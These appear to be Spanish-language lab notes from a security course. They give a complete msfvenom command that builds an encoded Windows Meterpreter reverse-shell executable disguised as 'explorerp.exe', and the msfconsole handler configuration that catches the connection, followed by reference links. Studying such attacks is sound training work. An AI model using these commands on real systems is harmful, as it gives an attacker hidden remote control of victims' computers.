# Vectores de ataque

Para esta practica se ha tenido que deshabilitar el antivirus de windows.

# Crear payload

```bash
> /usr/bin/msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp -e x64/xor -b '\x00' -i 10  LHOST=10.0.0.3 LPORT=4444 -f exe -o explorerp.exe
```
```bash
> msfconsole -q //Abrimos consola

#Configuramos el manejador del exploit

> use exploit/multi/handler #
> show options
> set LHOST 10.0.0.3
> set LPORT 4444
> set PAYLOAD windows/meterpreter/reverse_tcp
> exploit
```

# Artículos y Videos
  * https://keepcoding.io/blog/comandos-de-meterpreter/
  * https://es.scribd.com/document/467898739/Listado-comandos-Basicos-meterpreter-SF
  * https://elhacker.info/Cursos/OpenWebinars%20Hacking%20Tools%20Blue%20Team/Metasploit_100_.pdf
  * https://www.youtube.com/watch?v=VWeYLA58Vt8
  * https://labex.io/es/tutorials/linux-linux-nc-netcat-command-with-practical-examples-422835
  * https://www.startupdefense.io/es-us/blog/what-is-dwell-time-for-cybersecurity-e
  * https://www.zonamovilidad.es/las-empresas-tardan-13-horas-de-media-en-detectar-una-amenaza.html
  * https://www.itdigitalsecurity.es/endpoint/2021/09/hora-y-media-es-el-tiempo-que-tarda-un-ciberdelincuente-en-conseguir-su-objetivo

